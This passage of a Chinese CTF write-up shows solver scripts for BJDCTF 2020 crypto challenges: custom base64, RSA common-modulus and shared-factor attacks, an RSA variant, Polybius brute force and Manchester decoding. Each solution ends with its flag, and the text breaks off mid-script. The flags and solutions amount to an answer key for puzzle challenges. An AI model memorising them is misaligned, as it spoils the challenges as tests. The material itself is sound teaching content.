		src_len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		dest_len <span class="token operator">=</span> <span class="token function">src_get_dest_len</span><span class="token punctuation">(</span>src_len<span class="token punctuation">)</span><span class="token punctuation">;</span>
		buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>dest_len<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>buf <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
			<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
		<span class="token function">base64_decode</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> src_len<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> dest_len<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"base64 str:%s\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"base64_decode str:%s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"encode"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
		src_len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		dest_len <span class="token operator">=</span> <span class="token function">base64_get_dest_len</span><span class="token punctuation">(</span>src_len<span class="token punctuation">)</span><span class="token punctuation">;</span>
		buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>dest_len<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>buf <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
			<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
		<span class="token function">base64_encode</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> src_len<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> dest_len<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"src str:%s\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"base64_encode str:%s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token function">free</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
	buf <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">root@Kali:~# gcc 0.c
root@Kali:~# .&#x2F;a.out decode FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw
base64 str:FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw
base64_decode str:BJD&#123;D0_Y0u_kNoW_Th1s_b4se_map&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>hex编码</p>
<p><code>BJD&#123;We1c0me_t4_BJDCTF&#125;</code></p>
<h2 id="rsa-output"><a href="#rsa-output" class="headerlink" title="rsa_output"></a>rsa_output</h2><p>RSA共模攻击</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
<span class="token keyword">import</span> libnum

n<span class="token operator">=</span> <span class="token number">21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111</span>
e1<span class="token operator">=</span> <span class="token number">2767</span>
e2<span class="token operator">=</span> <span class="token number">3659</span>
c1<span class="token operator">=</span> <span class="token number">20152490165522401747723193966902181151098731763998057421967155300933719378216342043730801302534978403741086887969040721959533190058342762057359432663717825826365444996915469039056428416166173920958243044831404924113442512617599426876141184212121677500371236937127571802891321706587610393639446868836987170301813018218408886968263882123084155607494076330256934285171370758586535415136162861138898728910585138378884530819857478609791126971308624318454905992919405355751492789110009313138417265126117273710813843923143381276204802515910527468883224274829962479636527422350190210717694762908096944600267033351813929448599</span>
c2<span class="token operator">=</span> <span class="token number">11298697323140988812057735324285908480504721454145796535014418738959035245600679947297874517818928181509081545027056523790022598233918011261011973196386395689371526774785582326121959186195586069851592467637819366624044133661016373360885158956955263645614345881350494012328275215821306955212788282617812686548883151066866149060363482958708364726982908798340182288702101023393839781427386537230459436512613047311585875068008210818996941460156589314135010438362447522428206884944952639826677247819066812706835773107059567082822312300721049827013660418610265189288840247186598145741724084351633508492707755206886202876227</span>
gcd<span class="token punctuation">,</span> s<span class="token punctuation">,</span> t <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcdext<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span>
<span class="token keyword">if</span> s <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
	s <span class="token operator">=</span> <span class="token operator">-</span>s
	c1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">if</span> t <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
	t <span class="token operator">=</span> <span class="token operator">-</span>t
	c2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> n<span class="token punctuation">)</span>

m <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c1<span class="token punctuation">,</span>s<span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span class="token operator">*</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c2<span class="token punctuation">,</span>t<span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span class="token operator">%</span> n
<span class="token keyword">print</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>n1和n2共用一个q，可以先求最大公约数求出q，然后求出p，然后通过m（或者pow(294,e,n)）可以求出e，就把RSA的所有参数求出来了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum
<span class="token keyword">import</span> gmpy2

c1 <span class="token operator">=</span> <span class="token number">12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120</span>
n1 <span class="token operator">=</span> <span class="token number">13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037</span>
c3 <span class="token operator">=</span> <span class="token number">381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018</span>
c2 <span class="token operator">=</span> <span class="token number">979153370552535153498477459720877329811204688208387543826122582132404214848454954722487086658061408795223805022202997613522014736983452121073860054851302343517756732701026667062765906277626879215457936330799698812755973057557620930172778859116538571207100424990838508255127616637334499680058645411786925302368790414768248611809358160197554369255458675450109457987698749584630551177577492043403656419968285163536823819817573531356497236154342689914525321673807925458651854768512396355389740863270148775362744448115581639629326362342160548500035000156097215446881251055505465713854173913142040976382500435185442521721</span>
n2 <span class="token operator">=</span> <span class="token number">12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047</span>

<span class="token comment">#q = gmpy2.gcd(n1, n2)</span>
<span class="token comment">#print q</span>
<span class="token comment">#p1 = n1 / q</span>
<span class="token comment">#p2 = n2 / q</span>
<span class="token comment">#print p1</span>
<span class="token comment">#print p2</span>

q <span class="token operator">=</span> <span class="token number">99855353761764939308265951492116976798674681282941462516956577712943717850048051273358745095906207085170915794187749954588685850452162165059831749303473106541930948723000882713453679904525655327168665295207423257922666721077747911860159181041422993030618385436504858943615630219459262419715816361781062898911</span>
p1 <span class="token operator">=</span> <span class="token number">135283423427545651023916134156519717109709399113553907832988770259402226695880524199087896377303631866790192008529658716376684328032075836094156150811025163336681163420875451747389868549203081743561907379260240665153166927504059379076555558704275659133135906827306189040804323574468819553401905127999523676067</span>
p2 <span class="token operator">=</span> <span class="token number">128247614380441198621646495410948309946997239795951661931273072927374035259759992149357909896141726187046548986417994702167046344214464500647935997258628531837792334712721963467008407166687868929005971168361860024531036817205076054969304421022680304986295959208344157424943500032828301016675631415023886775977</span>

<span class="token comment">#for e in range(0,100000):</span>
<span class="token comment">#    if pow(294, e, n1) == c3:</span>
<span class="token comment">#	print e</span>
<span class="token comment">#	break</span>

e <span class="token operator">=</span> <span class="token number">52361</span>
phi <span class="token operator">=</span> <span class="token punctuation">(</span>p1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n1<span class="token punctuation">)</span>
<span class="token keyword">print</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>flag: <code>BJD&#123;p_is_common_divisor&#125;</code></p>
<h2 id="easyrsa"><a href="#easyrsa" class="headerlink" title="easyrsa"></a>easyrsa</h2><p>实际上z=p^2+q^2</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum
<span class="token keyword">import</span> gmpy2

e <span class="token operator">=</span> <span class="token number">65537</span>
c <span class="token operator">=</span> <span class="token number">7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035</span>
z <span class="token operator">=</span> <span class="token number">32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482</span>
n <span class="token operator">=</span> <span class="token number">15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441</span>

p_and_q <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>z <span class="token operator">+</span> <span class="token number">2</span><span class="token operator">*</span>n<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
phi <span class="token operator">=</span> n <span class="token operator">-</span> p_and_q <span class="token operator">+</span> <span class="token number">1</span>
d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">print</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>flag:<code>BJD&#123;Advanced_mathematics_is_too_hard!!!&#125;</code></p>
<h2 id="Polybius"><a href="#Polybius" class="headerlink" title="Polybius"></a>Polybius</h2><p>棋盘密码，特点：密文长度是明文长度的两倍</p>
<p>密文中只出现了aeiou，解密不对，需要爆破顺序，即5！个,不太会写脚本（菜。。。）</p>
<p>官方wp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itertools

key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
cipher <span class="token operator">=</span> <span class="token string">"ouauuuoooeeaaiaeauieuooeeiea"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>permutations<span class="token punctuation">(</span><span class="token string">'aeiou'</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    key<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> each <span class="token keyword">in</span> key<span class="token punctuation">:</span>
    temp_cipher <span class="token operator">=</span> <span class="token string">""</span>
    result <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> temp <span class="token keyword">in</span> cipher<span class="token punctuation">:</span>
        temp_cipher <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>each<span class="token punctuation">.</span>index<span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span>          
<span class="token comment">#这里其实是将字母的表换成数字的表以便后续计算</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp_cipher<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        current_ascii <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>temp_cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span><span class="token operator">+</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp_cipher<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">97</span>     
<span class="token comment">#因为棋盘密码是采用两位一起表示一个字母</span>
        <span class="token keyword">if</span> current_ascii<span class="token operator">></span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            current_ascii<span class="token operator">+=</span><span class="token number">1</span>
        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>current_ascii<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">"flag"</span> <span class="token keyword">in</span> result<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>each<span class="token punctuation">,</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>长度14，猜测flag就是flagispolybius</p>
<pre class="line-numbers language-none"><code class="language-none">uoaei flagispolybius
uoaie flagkxoplubkyx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><code>BJD&#123;flagispolybius&#125;</code></p>
<h2 id="编码与调制"><a href="#编码与调制" class="headerlink" title="编码与调制"></a>编码与调制</h2><p>曼彻斯特编码，学习了学习了。。。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">msg<span class="token operator">=</span><span class="token number">0x2559659965656a9a65656996696965a6695669a9695a699569666a5a6a6569666a59695a69aa696569666aa6</span>
s<span class="token operator">=</span><span class="token builtin">bin</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
r<span class="token operator">=</span><span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> s<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">:</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'10'</span><span class="token punctuation">:</span>
        r <span class="token operator">+=</span> <span class="token string">'1'</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        r <span class="token operator">+=</span> <span class="token string">'0'</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>flag:<code>BJD&#123;DifManchestercode&#125;</code></p>
<h2 id="伏羲六十四卦"><a href="#伏羲六十四卦" class="headerlink" title="伏羲六十四卦"></a>伏羲六十四卦</h2><p>这套娃也套得太多了吧。。。</p>
<blockquote>
<p>参考：<a href="https://github.com/BjdsecCA/BJDCTF2020_January">https://github.com/BjdsecCA/BJDCTF2020_January</a></p>
</blockquote>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
<span class="token keyword">from</span> binascii <span class="token keyword">import</span> a2b_hex
enc<span class="token operator">=</span><span class="token string">'升随临损巽睽颐萃小过讼艮颐小过震蛊屯未济中孚艮困恒晋升损蛊萃蛊未济巽解艮贲未济观豫损蛊晋噬嗑晋旅解大畜困未济随蒙升解睽未济井困未济旅萃未济震蒙未济师涣归妹大有'</span>
mydisc<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'坤'</span><span class="token punctuation">:</span> <span class="token string">'000000'</span><span class="token punctuation">,</span> <span class="token string">'剥'</span><span class="token punctuation">:</span> <span class="token string">'000001'</span><span class="token punctuation">,</span> <span class="token string">'比'</span><span class="token punctuation">:</span> <span class="token string">'000010'</span><span class="token punctuation">,</span> <span class="token string">'观'</span><span class="token punctuation">:</span> <span class="token string">'000011'</span><span class="token punctuation">,</span> <span class="token string">'豫'</span><span class="token punctuation">:</span> <span class="token string">'000100'</span><span class="token punctuation">,</span> <span class="token string">'晋'</span><span class="token punctuation">:</span> <span class="token string">'000101'</span><span class="token punctuation">,</span> <span class="token string">'萃'</span><span class="token punctuation">:</span> <span class="token string">'000110'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">:</span> <span class="token string">'000111'</span><span class="token punctuation">,</span> <span class="token string">'谦'</span><span class="token punctuation">:</span> <span class="token string">'001000'</span><span class="token punctuation">,</span> <span class="token string">'艮'</span><span class="token punctuation">:</span> <span class="token string">'001001'</span><span class="token punctuation">,</span> <span class="token string">'蹇'</span><span class="token punctuation">:</span> <span class="token string">'001010'</span><span class="token punctuation">,</span> <span class="token string">'渐'</span><span class="token punctuation">:</span> <span class="token string">'001011'</span><span class="token punctuation">,</span> <span class="token string">'小过'</span><span class="token punctuation">:</span> <span class="token string">'001100'</span><span class="token punctuation">,</span> <span class="token string">'旅'</span><span class="token punctuation">:</span> <span class="token string">'001101'</span><span class="token punctuation">,</span> <span class="token string">'咸'</span><span class="token punctuation">:</span> <span class="token string">'001110'</span><span class="token punctuation">,</span> <span class="token string">'遁'</span><span class="token punctuation">:</span> <span class="token string">'001111'</span><span class="token punctuation">,</span> <span class="token string">'师'</span><span class="token punctuation">:</span> <span class="token string">'010000'</span><span class="token punctuation">,</span> <span class="token string">'蒙'</span><span class="token punctuation">:</span> <span class="token string">'010001'</span><span class="token punctuation">,</span> <span class="token string">'坎'</span><span class="token punctuation">:</span> <span class="token string">'010010'</span><span class="token punctuation">,</span> <span class="token string">'涣'</span><span class="token punctuation">:</span> <span class="token string">'010011'</span><span class="token punctuation">,</span> <span class="token string">'解'</span><span class="token punctuation">:</span> <span class="token string">'010100'</span><span class="token punctuation">,</span> <span class="token string">'未济'</span><span class="token punctuation">:</span> <span class="token string">'010101'</span><span class="token punctuation">,</span> <span class="token string">'困'</span><span class="token punctuation">:</span> <span class="token string">'010110'</span><span class="token punctuation">,</span> <span class="token string">'讼'</span><span class="token punctuation">:</span> <span class="token string">'010111'</span><span class="token punctuation">,</span> <span class="token string">'升'</span><span class="token punctuation">:</span> <span class="token string">'011000'</span><span class="token punctuation">,</span> <span class="token string">'蛊'</span><span class="token punctuation">:</span> <span class="token string">'011001'</span><span class="token punctuation">,</span> <span class="token string">'井'</span><span class="token punctuation">:</span> <span class="token string">'011010'</span><span class="token punctuation">,</span> <span class="token string">'巽'</span><span class="token punctuation">:</span> <span class="token string">'011011'</span><span class="token punctuation">,</span> <span class="token string">'恒'</span><span class="token punctuation">:</span> <span class="token string">'011100'</span><span class="token punctuation">,</span> <span class="token string">'鼎'</span><span class="token punctuation">:</span> <span class="token string">'011101'</span><span class="token punctuation">,</span> <span class="token string">'大过'</span><span class="token punctuation">:</span> <span class="token string">'011110'</span><span class="token punctuation">,</span> <span class="token string">'姤'</span><span class="token punctuation">:</span> <span class="token string">'011111'</span><span class="token punctuation">,</span> <span class="token string">'复'</span><span class="token punctuation">:</span> <span class="token string">'100000'</span><span class="token punctuation">,</span> <span class="token string">'颐'</span><span class="token punctuation">:</span> <span class="token string">'100001'</span><span class="token punctuation">,</span> <span class="token string">'屯'</span><span class="token punctuation">:</span> <span class="token string">'100010'</span><span class="token punctuation">,</span> <span class="token string">'益'</span><span class="token punctuation">:</span> <span class="token string">'100011'</span><span class="token punctuation">,</span> <span class="token string">'震'</span><span class="token punctuation">:</span> <span class="token string">'100100'</span><span class="token punctuation">,</span> <span class="token string">'噬嗑'</span><span class="token punctuation">:</span> <span class="token string">'100101'</span><span class="token punctuation">,</span> <span class="token string">'随'</span><span class="token punctuation">:</span> <span class="token string">'100110'</span><span class="token punctuation">,</span> <span class="token string">'无妄'</span><span class="token punctuation">:</span> <span class="token string">'100111'</span><span class="token punctuation">,</span> <span class="token string">'明夷'</span><span class="token punctuation">:</span> <span class="token string">'101000'</span><span class="token punctuation">,</span> <span class="token string">'贲'</span><span class="token punctuation">:</span> <span class="token string">'101001'</span><span class="token punctuation">,</span> <span class="token string">'既济'</span><span class="token punctuation">:</span> <span class="token string">'101010'</span><span class="token punctuation">,</span> <span class="token string">'家人'</span><span class="token punctuation">:</span> <span class="token string">'101011'</span><span class="token punctuation">,</span> <span class="token string">'丰'</span><span class="token punctuation">:</span> <span class="token string">'101100'</span><span class="token punctuation">,</span> <span class="token string">'离'</span><span class="token punctuation">:</span> <span class="token string">'101101'</span><span class="token punctuation">,</span> <span class="token string">'革'</span><span class="token punctuation">:</span> <span class="token string">'101110'</span><span class="token punctuation">,</span> <span class="token string">'同人'</span><span class="token punctuation">:</span> <span class="token string">'101111'</span><span class="token punctuation">,</span> <span class="token string">'临'</span><span class="token punctuation">:</span> <span class="token string">'110000'</span><span class="token punctuation">,</span> <span class="token string">'损'</span><span class="token punctuation">:</span> <span class="token string">'110001'</span><span class="token punctuation">,</span> <span class="token string">'节'</span><span class="token punctuation">:</span> <span class="token string">'110010'</span><span class="token punctuation">,</span> <span class="token string">'中孚'</span><span class="token punctuation">:</span> <span class="token string">'110011'</span><span class="token punctuation">,</span> <span class="token string">'归妹'</span><span class="token punctuation">:</span> <span class="token string">'110100'</span><span class="token punctuation">,</span> <span class="token string">'睽'</span><span class="token punctuation">:</span> <span class="token string">'110101'</span><span class="token punctuation">,</span> <span class="token string">'兑'</span><span class="token punctuation">:</span> <span class="token string">'110110'</span><span class="token punctuation">,</span> <span class="token string">'履'</span><span class="token punctuation">:</span> <span class="token string">'110111'</span><span class="token punctuation">,</span> <span class="token string">'泰'</span><span class="token punctuation">:</span> <span class="token string">'111000'</span><span class="token punctuation">,</span> <span class="token string">'大畜'</span><span class="token punctuation">:</span> <span class="token string">'111001'</span><span class="token punctuation">,</span> <span class="token string">'需'</span><span class="token punctuation">:</span> <span class="token string">'111010'</span><span class="token punctuation">,</span> <span class="token string">'小畜'</span><span class="token punctuation">:</span> <span class="token 